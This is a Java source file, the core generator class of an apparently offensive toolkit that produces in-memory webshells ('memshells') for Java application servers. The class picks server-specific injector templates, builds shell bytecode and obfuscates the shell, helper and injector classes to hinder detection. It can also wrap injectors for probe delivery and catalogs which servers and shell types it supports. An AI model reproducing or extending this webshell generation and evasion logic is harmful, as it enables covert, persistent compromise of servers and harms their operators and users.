package com.reajason.javaweb.memshell;

import com.reajason.javaweb.GenerationException;
import com.reajason.javaweb.ShellGenerator;
import com.reajason.javaweb.memshell.config.InjectorConfig;
import com.reajason.javaweb.memshell.config.ObfuscationConfig;
import com.reajason.javaweb.memshell.config.ObfuscationScope;
import com.reajason.javaweb.memshell.config.ShellConfig;
import com.reajason.javaweb.memshell.config.ShellToolConfig;
import com.reajason.javaweb.memshell.generator.InjectorGenerator;
import com.reajason.javaweb.memshell.obfuscation.ClassObfuscation;
import com.reajason.javaweb.memshell.obfuscation.MethodContracts;
import com.reajason.javaweb.memshell.obfuscation.MethodSignature;
import com.reajason.javaweb.memshell.obfuscation.ObfuscationInfo;
import com.reajason.javaweb.memshell.obfuscation.ObfuscationTarget;
import com.reajason.javaweb.memshell.server.AbstractServer;
import com.reajason.javaweb.memshell.spi.ShellToolProvider;
import com.reajason.javaweb.probe.config.ProbeConfig;
import com.reajason.javaweb.probe.generator.response.ResponseGenerator;
import com.reajason.javaweb.utils.CommonUtil;
import com.reajason.javaweb.utils.StringUtils;
import com.reajason.javaweb.utils.tuple.Pair;
import net.bytebuddy.jar.asm.ClassReader;
import net.bytebuddy.jar.asm.Opcodes;

import java.lang.reflect.Constructor;
import java.util.ArrayList;
import java.util.Collections;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Set;
import java.util.logging.Logger;

/**
 * 内存马生成入口，也是所有查询服务的门面：先 {@code new MemShellGenerator()}，
 * 生成走 {@link #generate}，支持矩阵走 {@link #getShellTypeCatalog()}，
 * 服务端/工具查询走 {@link #getServer(String)}、{@link #getSupportedServers()} 等。
 *
 * <pre>
 * MemShellGenerator generator = new MemShellGenerator();
 * MemShellResult result = generator.generate(shellConfig, injectorConfig, params);
 * </pre>
 *
 * <p>实例本身无状态，底层共享 {@link MemShellRegistry} 单例，随处 new 都是同一份注册表。
 *
 * @author ReaJason
 * @since 2024/11/24
 */
public class MemShellGenerator {

    private static final Logger LOG = Logger.getLogger(MemShellGenerator.class.getName());

    private final MemShellRegistry registry;

    public MemShellGenerator() {
        this.registry = MemShellRegistry.getInstance();
    }

    public MemShellResult generate(ShellConfig shellConfig, InjectorConfig injectorConfig,
                                   Map<String, String> shellToolParams) {
        return generate(shellConfig, injectorConfig,
                ToolConfigFactory.fromParams(shellConfig.getShellTool(), shellToolParams));
    }

    public MemShellResult generate(ShellConfig shellConfig, InjectorConfig injectorConfig, ShellToolConfig shellToolConfig) {
        // 入口补齐：调用方只保证传了必要字段（反序列化出来的配置，没传的字段就是 null / 0），缺的在这里
        // 按默认值补上并写回，下游 server 模块与注入器生成不必各自判空。targetJreVersion 的 0 不是合法
        // class 版本，等同「没传」。写回是为了让调用方拿到的配置与真正生成时用的一致。
        if (injectorConfig == null) {
            injectorConfig = InjectorConfig.builder().build();
        }
        if (StringUtils.isBlank(shellConfig.getServerVersion())) {
            shellConfig.setServerVersion("unknown");
        }
        if (shellConfig.getTargetJreVersion() == 0) {
            shellConfig.setTargetJreVersion(Opcodes.V1_6);
        }
        if (StringUtils.isBlank(injectorConfig.getUrlPattern())) {
            injectorConfig.setUrlPattern("/*");
        }
        String shellType = shellConfig.getShellType();
        if ((ShellType.RAW_WEBSOCKET.equals(shellType) || ShellType.JAKARTA_RAW_WEBSOCKET.equals(shellType))
                && isInvalidSpecificUrlPattern(injectorConfig.getUrlPattern())) {
            throw new GenerationException(shellType + " requires a specific urlPattern, e.g. /ws");
        }
        String serverName = shellConfig.getServer();
        AbstractServer server = registry.getServer(serverName);
        if (server == null) {
            throw new GenerationException("Unsupported server: " + serverName);
        }
        String injectorTemplateClassName;

        if (ShellTool.Custom.equals(shellConfig.getShellTool())) {
            injectorTemplateClassName = server.getShellInjectorMapping().getInjector(shellConfig.getShellType());
        } else {
            Pair<String, String> shellInjectorPair = server.getShellInjectorPair(shellConfig.getShellTool(), shellConfig.getShellType());
            if (shellInjectorPair == null) {
                throw new GenerationException(serverName + " unsupported shell type: " + shellConfig.getShellType() + " for tool: " + shellConfig.getShellTool());
            }
            String shellTemplateClassName = shellInjectorPair.getLeft();
            injectorTemplateClassName = shellInjectorPair.getRight();
            shellToolConfig.setShellTemplateClassName(shellTemplateClassName);
        }

        if (StringUtils.isBlank(shellToolConfig.getShellClassName())) {
            shellToolConfig.setShellClassName(AbstractServer.generateShellClassName(serverName, shellConfig.getShellType()));
        }

        if (StringUtils.isBlank(injectorConfig.getInjectorClassName())) {
            injectorConfig.setInjectorClassName(CommonUtil.generateInjectorClassName());
        }

        if (shellConfig.isLambdaSuffix()) {
            shellToolConfig.setShellClassName(CommonUtil.appendLambdaSuffix(shellToolConfig.getShellClassName()));
            injectorConfig.setInjectorClassName(CommonUtil.appendLambdaSuffix(injectorConfig.getInjectorClassName()));
        }

        byte[] shellBytes = generateShellBytes(shellConfig, shellToolConfig);
        shellBytes = server.postProcessShellBytes(shellBytes, shellConfig, shellToolConfig, injectorConfig);

        boolean obfuscationEnabled = shellConfig.isObfuscationEnabled();
        ObfuscationScope obfuscationScope = shellConfig.getObfuscationScope();
        byte[] helperClassBytes = injectorConfig.getHelperClassBytes();

        // shell/helper 都在 InjectorGenerator gzip+base64 嵌入前处理；helper 的返回副本与嵌入副本因此一致。
        ObfuscationInfo obfuscationInfo = null;
        if (obfuscationEnabled) {
            obfuscationInfo = ObfuscationInfo.builder().enabled(true).build();
            if (obfuscationScope.includesMemshell()) {
                ObfuscationConfig containerObfuscationConfig = containerObfuscationConfig(shellConfig, server);
                obfuscationInfo.setOriginalShellSize(shellBytes.length);
                Map<String, byte[]> shellRelatedClasses = new LinkedHashMap<String, byte[]>();
                if (helperClassBytes != null) {
                    shellRelatedClasses.put("helper", helperClassBytes);
                }
                shellBytes = ClassObfuscation.obfuscate(
                        shellBytes, shellToolConfig.getShellClassName(),
                        shellConfig.getTargetJreVersion(), ObfuscationTarget.SHELL,
                        containerObfuscationConfig,
                        server.getShellMethodContracts(shellConfig.getShellType()),
                        server.getShellFieldContracts(shellConfig.getShellType()),
                        shellRelatedClasses, true);
                obfuscationInfo.setObfuscatedShellSize(shellBytes.length);

                if (obfuscationScope.includesHelperAndWrapper() && helperClassBytes != null) {
                    Map<String, byte[]> helperRelatedClasses = Collections.<String, byte[]>singletonMap("shell", shellBytes);
                    Set<MethodSignature> helperContracts = MethodContracts.CONSERVATIVE;
                    if (ShellType.RAW_WEBSOCKET.equals(shellType)
                            || ShellType.JAKARTA_RAW_WEBSOCKET.equals(shellType)) {
                        helperContracts = MethodContracts.RAW_WEBSOCKET_HELPER_CONTRACTS;
                    }
                    helperClassBytes = ClassObfuscation.obfuscate(
                            helperClassBytes, helperClassName(helperClassBytes),
                            shellConfig.getTargetJreVersion(), ObfuscationTarget.HELPER,
                            containerObfuscationConfig, helperContracts,
                            helperRelatedClasses, true);
                    injectorConfig.setHelperClassBytes(helperClassBytes);
                }
            }
        }

        injectorConfig.setInjectorTemplateClassName(injectorTemplateClassName);
        injectorConfig.setInjectorTemplateClassLoader(server.getClass().getClassLoader());
        injectorConfig.setShellClassName(shellToolConfig.getShellClassName());
        injectorConfig.setShellClassBytes(shellBytes);

        InjectorGenerator injectorGenerator = new InjectorGenerator(shellConfig, injectorConfig);
        byte[] injectorBytes = injectorGenerator.generate();
        Map<String, byte[]> innerClassBytes = injectorGenerator.getInnerClassBytes();
        boolean probeMode = shellConfig.getProbe() != null
                && !shellConfig.getShellType().startsWith(ShellType.AGENT);

        // 注入器按完整产物组处理。每个类都以其余原始类为扫描输入，双向保护直接方法/字段引用；
        // 类名保持不变，RawWsHelper 与 Dubbo 的派生类名契约不受影响。
        if (obfuscationEnabled && obfuscationScope.includesInjector()) {
            obfuscationInfo.setOriginalInjectorSize(injectorBytes.length);
            byte[] originalInjectorBytes = injectorBytes;
            Map<String, byte[]> originalInnerClassBytes = new LinkedHashMap<String, byte[]>(innerClassBytes);
            Map<String, byte[]> relatedClasses = new LinkedHashMap<String, byte[]>(originalInnerClassBytes);
            if (helperClassBytes != null) {
                relatedClasses.put("helper", helperClassBytes);
            }
            // 可嵌入体积校验只针对真正会被 gzip+base64 嵌入回显 Wrapper 的产物。
            injectorBytes = ClassObfuscation.obfuscate(
                    injectorBytes, injectorConfig.getInjectorClassName(),
                    shellConfig.getTargetJreVersion(), ObfuscationTarget.INJECTOR, shellConfig.getObfuscation(),
                    server.getInjectorMethodContracts(shellConfig.getShellType()), relatedClasses, probeMode);
            obfuscationInfo.setObfuscatedInjectorSize(injectorBytes.length);

            Map<String, byte[]> obfuscatedInnerClassBytes = new LinkedHashMap<String, byte[]>();
            for (Map.Entry<String, byte[]> entry : originalInnerClassBytes.entrySet()) {
                Map<String, byte[]> companionRelatedClasses = new LinkedHashMap<String, byte[]>(originalInnerClassBytes);
                companionRelatedClasses.remove(entry.getKey());
                companionRelatedClasses.put("injector", originalInjectorBytes);
                if (helperClassBytes != null) {
                    companionRelatedClasses.put("helper", helperClassBytes);
                }
                byte[] companionBytes = ClassObfuscation.obfuscate(
                        entry.getValue(), entry.getKey(), shellConfig.getTargetJreVersion(),
                        ObfuscationTarget.INJECTOR, shellConfig.getObfuscation(),
                        MethodContracts.CONSERVATIVE, companionRelatedClasses, false);
                obfuscatedInnerClassBytes.put(entry.getKey(), companionBytes);
            }
            innerClassBytes = obfuscatedInnerClassBytes;
        }

        if (probeMode) {
            ProbeConfig probeConfig = shellConfig.getProbe();
            probeConfig.setTargetJreVersion(shellConfig.getTargetJreVersion());
            probeConfig.setByPassJavaModule(shellConfig.isByPassJavaModule());
            probeConfig.setShrink(shellConfig.isShrink());
            probeConfig.setDebug(shellConfig.isDebug());
            probeConfig.setStaticInitialize(injectorConfig.isStaticInitialize());
            injectorBytes = ResponseGenerator.wrapBytecode(probeConfig, serverName,
                    injectorConfig.getInjectorClassName() + "Wrapper", injectorBytes);
            injectorConfig.setInjectorClassName(probeConfig.getShellClassName());
            if (obfuscationEnabled && obfuscationScope.includesHelperAndWrapper()) {
                injectorBytes = ClassObfuscation.obfuscate(
                        injectorBytes, injectorConfig.getInjectorClassName(),
                        shellConfig.getTargetJreVersion(), ObfuscationTarget.PROBE,
                        shellConfig.getObfuscation(), MethodContracts.PROBE_COMMON,
                        Collections.<String, byte[]>emptyMap(), false);
            }
        }

        helperClassBytes = injectorConfig.getHelperClassBytes();
        return MemShellResult.builder()
                .shellConfig(shellConfig)
                .shellToolConfig(shellToolConfig)
                .injectorConfig(injectorConfig)
                .shellClassName(shellToolConfig.getShellClassName())
                .shellBytes(shellBytes)
                .helperClassName(helperClassName(helperClassBytes))
                .helperBytes(helperClassBytes)
                .injectorClassName(injectorConfig.getInjectorClassName())
                .injectorBytes(injectorBytes)
                .injectorInnerClassBytes(innerClassBytes)
                .obfuscationInfo(obfuscationInfo)
                .build();
    }

    private static boolean isInvalidSpecificUrlPattern(String urlPattern) {
        return StringUtils.isBlank(urlPattern)
                || "/".equals(urlPattern)
                || "/*".equals(urlPattern)
                || !urlPattern.startsWith("/");
    }

    /**
     * 辅助类的展示名直接读字节里的内部名（RawWsHelper 按 shell 类名派生、Dubbo 是服务接口），
     * 与各 server 在 {@code postProcessShellBytes} 里生成 helper 时的命名天然一致。
     */
    private static String helperClassName(byte[] helperClassBytes) {
        if (helperClassBytes == null) {
            return null;
        }
        return new ClassReader(helperClassBytes).getClassName().replace('/', '.');
    }

    /**
     * 合并 server 声明的 shell/helper 混淆选项覆盖，server 覆盖优先。
     * <p>
     * 仅作用于 shell 与 helper：它们可能被注入器 defineClass 进容器/OSGi 类加载器，
     * 那里未必能解析 {@code javax.crypto}；注入器自身跑在 attach 进来的 system loader
     * 中，JDK 包可见，仍保留用户配置（包括 AES）。
     */
    private static ObfuscationConfig containerObfuscationConfig(ShellConfig shellConfig, AbstractServer server) {
        ObfuscationConfig obfuscation = shellConfig.getObfuscation();
        if (obfuscation == null || !obfuscation.isEnabled()) {
            return obfuscation;
        }
        Map<String, Object> overrides = server.getShellObfuscationOptionOverrides(shellConfig.getShellType());
        if (overrides == null || overrides.isEmpty()) {
            return obfuscation;
        }
        Map<String, Object> options = new LinkedHashMap<String, Object>(obfuscation.getOptions());
        for (Map.Entry<String, Object> override : overrides.entrySet()) {
            Object previous = options.put(override.getKey(), override.getValue());
            if (previous != null && !previous.equals(override.getValue())) {
                LOG.warning("Shell obfuscation option " + override.getKey() + "=" + override.getValue()
                        + " overrides configured value " + previous + " for " + shellConfig.getServer()
                        + " shell type " + shellConfig.getShellType()
                        + " (shell/helper are defined in a restricted container classloader)");
            }
        }
        return ObfuscationConfig.enabled(options);
    }

    /**
     * 「服务端 → 工具 → 挂载类型」支持矩阵的一份快照，按轴查询用返回的 {@link ShellTypeCatalog}，
     * 要整张表（接口序列化、整表遍历）用 {@link ShellTypeCatalog#asMap()}。
     * 每次调用都重新从注册表取快照，动态注册（{@code registerServer/registerTool}）后能立即反映。
     */
    public ShellTypeCatalog getShellTypeCatalog() {
        return new ShellTypeCatalog();
    }

    /**
     * @return 已注册的服务端（SPI 发现顺序）；未知服务端的名字不会出现
     */
    public List<String> getSupportedServers() {
        return registry.getSupportedServers();
    }

    /**
     * @return 该服务端的实例；没注册过（含 {@code serverName} 为 null）返回 null
     */
    public AbstractServer getServer(String serverName) {
        return registry.getServer(serverName);
    }

    /**
     * @return 已注册的 shell 工具（声明顺序）
     */
    public List<String> getSupportedTools() {
        return registry.getSupportedTools();
    }

    /**
     * @return 该工具的 provider；没注册过（含 {@code toolName} 为 null，如界面上的工具没选）返回 null
     */
    public ShellToolProvider getToolProvider(String toolName) {
        return registry.getToolProvider(toolName);
    }

    private byte[] generateShellBytes(ShellConfig shellConfig, ShellToolConfig shellToolConfig) {
        ShellToolProvider provider = registry.getToolProvider(shellConfig.getShellTool());
        if (provider == null) {
            throw new GenerationException("Unsupported shell tool: " + shellConfig.getShellTool());
        }
        try {
            Constructor<? extends ShellGenerator> constructor = provider.getGeneratorClass()
                    .getConstructor(ShellConfig.class, provider.getConfigClass());
            ShellGenerator generator = constructor.newInstance(shellConfig, provider.getConfigClass().cast(shellToolConfig));
            return generator.getBytes();
        } catch (Exception e) {
            throw new GenerationException("shell generate failed " + e.getMessage(), e);
        }
    }

    /**
     * 「服务端 → 工具 → 挂载类型」支持矩阵快照，以及按轴查询它的方法。
     *
     * <p>快照由 {@link MemShellGenerator#getShellTypeCatalog()} 构建，之后各查询都在这份快照上做，
     * 不必每次重新遍历注册表。矩阵只收录「至少有一个可注入类型」的组合：某工具在某服务端下
     * 一个类型都拿不到注入器模板时（见 {@link AbstractServer#getSupportedShellTypes(String)}），
     * 不会出现在这里 —— 界面也就不会广告一个必然生成失败的组合。
     *
     * <p>要整张表（接口序列化、整表遍历）用 {@link #asMap()}；只要某一维就别再自己遍历嵌套 Map，
     * 用 {@link #getServers()}、{@link #getShellTools(String)}、{@link #getShellTypes(String, String)}、
     * {@link #getServersSupporting(String)}，它们对不存在的组合一律返回空列表而不是 null。
     *
     * @since 3.0.0
     */
    public final class ShellTypeCatalog {

        private final Map<String, Map<String, List<String>>> catalog;

        /**
         * 从注册表读一份快照：服务端保持注册顺序，工具保持声明顺序，类型保持注入器映射的顺序。
         */
        private ShellTypeCatalog() {
            Map<String, Map<String, List<String>>> catalog = new LinkedHashMap<String, Map<String, List<String>>>(16);
            for (String serverName : registry.getSupportedServers()) {
                AbstractServer server = registry.getServer(serverName);
                if (server == null) {
                    continue;
                }
                Map<String, List<String>> toolShellTypes = new LinkedHashMap<String, List<String>>(16);
                for (String shellTool : server.getSupportedShellTools()) {
                    Set<String> supportedShellTypes = server.getSupportedShellTypes(shellTool);
                    if (supportedShellTypes.isEmpty()) {
                        continue;
                    }
                    toolShellTypes.put(shellTool,
                            Collections.unmodifiableList(new ArrayList<String>(supportedShellTypes)));
                }
                catalog.put(serverName, Collections.unmodifiableMap(toolShellTypes));
            }
            this.catalog = Collections.unmodifiableMap(catalog);
        }

        /**
         * @return 整张矩阵（不可修改），给需要遍历或原样序列化的调用方
         */
        public Map<String, Map<String, List<String>>> asMap() {
            return catalog;
        }

        /**
         * @return 至少有一个可生成组合的服务端
         */
        public List<String> getServers() {
            return new ArrayList<String>(catalog.keySet());
        }

        /**
         * 能生成该工具的服务端，顺序与 {@link #getServers()} 一致。
         *
         * @param shellTool 工具名；为 null 或没注册过时返回空表
         */
        public List<String> getServersSupporting(String shellTool) {
            if (shellTool == null) {
                return Collections.emptyList();
            }
            List<String> servers = new ArrayList<String>();
            for (Map.Entry<String, Map<String, List<String>>> server : catalog.entrySet()) {
                if (server.getValue().containsKey(shellTool)) {
                    servers.add(server.getKey());
                }
            }
            return servers;
        }

        /**
         * 该服务端能用的工具。与 {@link MemShellGenerator#getSupportedTools()} 的区别是这里按服务端的
         * 注入器映射过滤过：一个类型都注入不了的工具不会出现。
         *
         * @param server 服务端名；未知服务端返回空表
         */
        public List<String> getShellTools(String server) {
            Map<String, List<String>> tools = catalog.get(server);
            return tools == null ? Collections.<String>emptyList() : new ArrayList<String>(tools.keySet());
        }

        /**
         * 该服务端用该工具能生成的挂载类型。
         *
         * @param server    服务端名
         * @param shellTool 工具名
         * @return 组合不存在（未知服务端/工具、或该工具在此服务端下一个类型都不支持）时返回空表
         */
        public List<String> getShellTypes(String server, String shellTool) {
            Map<String, List<String>> tools = catalog.get(server);
            List<String> shellTypes = tools == null || shellTool == null ? null : tools.get(shellTool);
            return shellTypes == null ? Collections.<String>emptyList() : new ArrayList<String>(shellTypes);
        }
    }
}
